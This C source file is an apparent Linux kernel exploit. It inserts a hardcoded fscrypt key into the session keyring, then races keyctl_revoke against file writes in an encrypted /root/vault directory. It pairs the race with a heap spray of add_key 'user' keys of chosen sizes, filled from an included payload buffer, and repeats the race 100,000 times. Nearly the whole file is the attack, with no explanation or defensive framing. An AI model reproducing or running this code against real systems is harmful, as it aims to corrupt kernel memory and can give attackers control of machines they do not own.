#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <keyutils.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <unistd.h>
#include "sha512.h"
#include "payload.h"

/* Begin <linux/fs.h> */
#define FS_MAX_KEY_SIZE			64
struct fscrypt_key {
	uint32_t mode;
	uint8_t raw[FS_MAX_KEY_SIZE];
	uint32_t size;
} __attribute__((packed));
#define FS_KEY_DESCRIPTOR_SIZE	8
#define FS_KEY_DESCRIPTOR_HEX_SIZE ((2 * FS_KEY_DESCRIPTOR_SIZE) + 1)
#define FS_POLICY_FLAGS_PAD_4		0x00
#define FS_POLICY_FLAGS_PAD_8		0x01
#define FS_POLICY_FLAGS_PAD_16		0x02
#define FS_POLICY_FLAGS_PAD_32		0x03
#define FS_POLICY_FLAGS_PAD_MASK	0x03
#define FS_POLICY_FLAGS_VALID		0x03

#define FS_ENCRYPTION_MODE_INVALID		0
#define FS_ENCRYPTION_MODE_AES_256_XTS		1
#define FS_ENCRYPTION_MODE_AES_256_GCM		2
#define FS_ENCRYPTION_MODE_AES_256_CBC		3
#define FS_ENCRYPTION_MODE_AES_256_CTS		4

struct fscrypt_policy {
  uint8_t version;
  uint8_t contents_encryption_mode;
  uint8_t filenames_encryption_mode;
  uint8_t flags;
  uint8_t master_key_descriptor[FS_KEY_DESCRIPTOR_SIZE];
} __attribute__((packed));

#define FS_IOC_SET_ENCRYPTION_POLICY _IOR('f', 19, struct fscrypt_policy)
#define FS_IOC_GET_ENCRYPTION_POLICY _IOW('f', 21, struct fscrypt_policy)

#define FS_KEY_DESC_PREFIX		"fscrypt:"
#define EXT4_KEY_DESC_PREFIX "ext4:"
#define MAX_KEY_DESC_PREFIX_SIZE 8
/* End <linux/fs.h> */

typedef int32_t key_serial_t;
#define KEYCTL_GET_KEYRING_ID 0
#define KEY_SPEC_THREAD_KEYRING		-1	/* - key ID for thread-specific keyring */
#define KEY_SPEC_PROCESS_KEYRING	-2	/* - key ID for process-specific keyring */
#define KEY_SPEC_SESSION_KEYRING	-3	/* - key ID for session-specific keyring */
#define KEY_SPEC_USER_KEYRING		-4	/* - key ID for UID-specific keyring */
#define KEY_SPEC_USER_SESSION_KEYRING	-5	/* - key ID for UID-session keyring */
#define KEY_SPEC_GROUP_KEYRING		-6	/* - key ID for GID-specific keyring */
#define KEY_SPEC_REQKEY_AUTH_KEY	-7	/* - key ID for assumed request_key auth key */
#define KEY_SPEC_REQUESTOR_KEYRING	-8	/* - key ID for request_key() dest keyring */

key_serial_t add_key(const char *type, const char *description,
                     const void *payload, size_t plen, key_serial_t ringid) 
{
	return syscall(__NR_add_key, type, description, payload, plen, ringid);
}
/*key_serial_t keyctl_get_keyring_ID(key_serial_t id, int create) {
	return syscall(__NR_keyctl, KEYCTL_GET_KEYRING_ID, id, create);
}*/
/* End <keyutils.h> */

#define NUM_ENCRYPTION_MODES 5
const char *const mode_strings[NUM_ENCRYPTION_MODES] = {
	"INVALID",     "AES-256-XTS", "AES-256-GCM", "AES-256-CBC",
	"AES-256-CTS"};
#define NUM_PADDING_VALUES 4
const int padding_values[NUM_PADDING_VALUES] = {4, 8, 16, 32};


// Takes an input key descriptor as a byte array and outputs a hex string.
static void key_descriptor_to_hex(const uint8_t bytes[FS_KEY_DESCRIPTOR_SIZE],
                                  char hex[FS_KEY_DESCRIPTOR_HEX_SIZE]) {
  int i;
  for (i = 0; i < FS_KEY_DESCRIPTOR_SIZE; ++i) {
    sprintf(hex + 2 * i, "%02x", bytes[i]);
  }
}

// Takes an input key descriptor as a hex string and outputs a bytes array.
// Returns non-zero if the provided hex string is not formatted correctly.
static int key_descriptor_to_bytes(const char *hex,
                                   uint8_t bytes[FS_KEY_DESCRIPTOR_SIZE]) {
  if (strlen(hex) != FS_KEY_DESCRIPTOR_HEX_SIZE - 1) {
    return -1;
  }

  int i, bytes_converted, chars_read;
  for (i = 0; i < FS_KEY_DESCRIPTOR_SIZE; ++i) {
    // We must read two hex characters of input into one byte of buffer.
    bytes_converted = sscanf(hex + 2 * i, "%2hhx%n", bytes + i, &chars_read);
    if (bytes_converted != 1 || chars_read != 2) {
      return -1;
    }
  }
  return 0;
}
static void compute_descriptor(const uint8_t key[FS_MAX_KEY_SIZE],
                               char descriptor[FS_KEY_DESCRIPTOR_HEX_SIZE]) {
  uint8_t digest1[SHA512_DIGEST_LENGTH];
  SHA512(key, FS_MAX_KEY_SIZE, digest1);

  uint8_t digest2[SHA512_DIGEST_LENGTH];
  SHA512(digest1, SHA512_DIGEST_LENGTH, digest2);

  key_descriptor_to_hex(digest2, descriptor);
  secure_wipe(digest1, SHA512_DIGEST_LENGTH);
  secure_wipe(digest2, SHA512_DIGEST_LENGTH);
}

int enc_key_serial;
static int insert_logon_key(const uint8_t key_data[FS_MAX_KEY_SIZE],
                            const char descriptor[FS_KEY_DESCRIPTOR_HEX_SIZE],
                            const char *service_prefix) {
  // We cannot add directly to KEY_SPEC_SESSION_KEYRING, as that will make a new
  // session keyring if one does not exist, rather than adding it to the user
  // session keyring.
  int keyring_id = keyctl_get_keyring_ID(KEY_SPEC_SESSION_KEYRING, 0);
  printf("keyring_id: %d\n",keyring_id);
  if (keyring_id < 0) {
	  perror("keyring_id");
    return -1;
  }

  char description[MAX_KEY_DESC_PREFIX_SIZE + FS_KEY_DESCRIPTOR_HEX_SIZE];
  sprintf(description, "%s%s", service_prefix, descriptor);

  struct fscrypt_key key = {.mode = 0, .size = FS_MAX_KEY_SIZE};
  memcpy(key.raw, key_data, FS_MAX_KEY_SIZE);

  enc_key_serial =
      add_key("logon", description, &key, sizeof(key), keyring_id);
  printf("enc_key_serial after add_key: %x\n",enc_key_serial);
  if(enc_key_serial <0)
	  return -1;
  return 0;
}

unsigned char key_data[] = {
	  0xc0, 0xb6, 0x6e, 0xff, 0xf1, 0x48, 0x86, 0x0c, 0x61, 0x9a, 0x94, 0x1b,
	    0xf9, 0x35, 0x0a, 0xff, 0xd0, 0x9e, 0xd2, 0xff, 0xce, 0x16, 0x55, 0x0e,
		  0x92, 0x65, 0x57, 0x5d, 0xf2, 0x29, 0x00, 0x65, 0xcf, 0x2b, 0xdd, 0xb6,
		    0x15, 0x41, 0x7f, 0x6a, 0x57, 0xcd, 0x30, 0xfa, 0x3a, 0x63, 0x14, 0x98,
			  0xef, 0x3f, 0xcc, 0xe6, 0xe1, 0xfd, 0x8c, 0x4a, 0xbc, 0xf6, 0x2f, 0xcb,
			    0xb8, 0xd0, 0xf4, 0x50
};
//unsigned int key_data_len = 64;
static int prepare_key(uint8_t key[FS_MAX_KEY_SIZE]){
/*
	size_t rc = fread(key, 1, FS_MAX_KEY_SIZE, stdin);
	int end = fgetc(stdin);
	// We should read exactly FS_MAX_KEY_SIZE bytes, then hit EOF
	if (rc == FS_MAX_KEY_SIZE && end == EOF && feof(stdin)) {
	  return 0;
	}
	
	fprintf(stderr, "error: input key must be %d bytes\n", FS_MAX_KEY_SIZE);
	return -1;
*/
	static uint8_t key_read[] = 
	"1234567812345678123456781234567812345678123456781234567812345678";
	//memcpy(key,key_read,FS_MAX_KEY_SIZE);
	memcpy(key, key_data,FS_MAX_KEY_SIZE);
	return 0;
		
	
}
// Insert a key read from stdin into the current session keyring. This has the
// effect of unlocking files encrypted with that key.
static int cmd_insert_key(){
	const char *service_prefix = FS_KEY_DESC_PREFIX;			
	static const struct option insert_key_options[] = {
		{"ext4", no_argument, NULL, 'e'},
		{NULL, 0, NULL, 0}
	};

    int ret = EXIT_SUCCESS;

	uint8_t key[FS_MAX_KEY_SIZE];
	if (prepare_key(key)) {			//read_key
		ret = EXIT_FAILURE;
		return ret;
	}
	service_prefix = EXT4_KEY_DESC_PREFIX;
	char descriptor[FS_KEY_DESCRIPTOR_HEX_SIZE];	
	compute_descriptor(key, descriptor);
	if (insert_logon_key(key, descriptor, service_prefix)) {
		perror("insert_logon_key");
    	fprintf(stderr, "error: inserting key: %s\n", strerror(errno));
    	ret = EXIT_FAILURE;
	}
	return ret;	
}

static int revoke_key(key_serial_t key){
	printf("revoking a key\n");
	keyctl_revoke(key);
	return 0;
}

//static int  read_key(key_serial_t key){
static int  read_key(){
	int keyring_id = keyctl_get_keyring_ID(KEY_SPEC_SESSION_KEYRING, 0);
	 printf("keyring_id: %d\n",keyring_id);
	char buf[2048];
	//int  payload_size=keyctl_read(keyring_id, buf, 2048);
	printf("enc_key_serial:%x\n",enc_key_serial);
	int  payload_size=keyctl_read(enc_key_serial, buf, 2048);
	if(payload_size<0){
		perror("invalid");
		return -1;
	}
	else{
		printf("sizeof payload: %d\n",payload_size);
		return 0;
	}
}

void *race_thread1(){
	revoke_key(enc_key_serial);
}

char buf_to_write[4096*20];

volatile int thread_cnt = 0;
char buf_recv[4096*20];
void *race_thread2(void* arg){
	int i;
	char filename[]="/root/vault/1\x00";
	filename[12]=0x41+(((unsigned long)arg)&0xff);
	int tmp_fd=open(filename,O_RDWR|O_CREAT,0644);
	if(tmp_fd<0){
		perror("open tmp");
	}
	write(tmp_fd,buf_to_write,4096*20);
	/*for(i=0;i<100;i++){
		write(tmp_fd,buf_to_write,4096*20);
		lseek(tmp_fd,0,SEEK_SET);
		read(tmp_fd,buf_to_write,4096*20);
	}*/
	close(tmp_fd);
	remove(filename);
	/*
	for(i=0;i<1000000;i++){
		lseek(tmp_fd,0,SEEK_SET);
		write(tmp_fd,buf_to_write,4096*20);
		lseek(tmp_fd,0,SEEK_SET);
		read(tmp_fd,buf_to_write,4096*20);
	}
	puts("done!");
	*/
}

int do_loop()
{
	pthread_t th[2];
	cmd_insert_key();
	//read_key();
	int i =0;
	pthread_create(&th[0], 0, race_thread2,(void*)i);
	//usleep(100000);
	pthread_create(&th[1],0,race_thread1,0);
		pthread_join(th[0],0);
		pthread_join(th[1],0);

}

int do_spray=1;

void *kmalloc(){
	int i=0;
	while(1){
		if(do_spray){
			if(i%3==1){
				syscall(__NR_add_key, "user", "wtf", buf_to_write, 0x1f, -2);
			}
			else if(i%3==0){
				syscall(__NR_add_key, "user", "wtf", buf_to_write, 0xc0, -2);
			}
			else{
				syscall(__NR_add_key, "user", "wtf", buf_to_write, 0xc0-18, -2);
			}
			i+=1;
			usleep(1);
		}
	}
}

int spray(){
	int i;
	pthread_t th;
	for(i=0;i<100;i++){
		pthread_create(&th,0,kmalloc,0);
	}
}

int main(){
	int i;
	memcpy(buf_to_write,payload,4096*20);
	spray();
	usleep(1000);
	for(i=0;i<100000;i++){
		do_loop();
	}
}
